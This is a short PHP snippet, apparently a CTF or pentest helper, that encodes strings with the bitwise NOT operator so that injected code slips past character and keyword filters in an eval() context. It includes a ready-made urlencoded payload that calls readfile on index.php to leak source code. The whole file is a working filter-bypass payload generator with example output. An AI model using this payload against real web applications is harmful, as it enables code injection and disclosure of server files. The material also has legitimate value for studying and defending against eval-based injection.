<?php

# PHP operator(~) flip bit to non characters bypass filter(symbols, keywords,..) like when we're in eval()

$payload = 'index.php';

$a = ~$payload;
echo urlencode($a);
echo "\n\n";

echo urldecode(~$a);
echo "\n\n";

# Example: Notice nest '(', ')' characters to form into php function

# readfile("index.php"); : (~%8D%9A%9E%9B%99%96%93%9A)(~%96%91%9B%9A%87%D1%8F%97%8F);
# readfile: %8D%9A%9E%9B%99%96%93%9A
# index.php: %96%91%9B%9A%87%D1%8F%97%8F
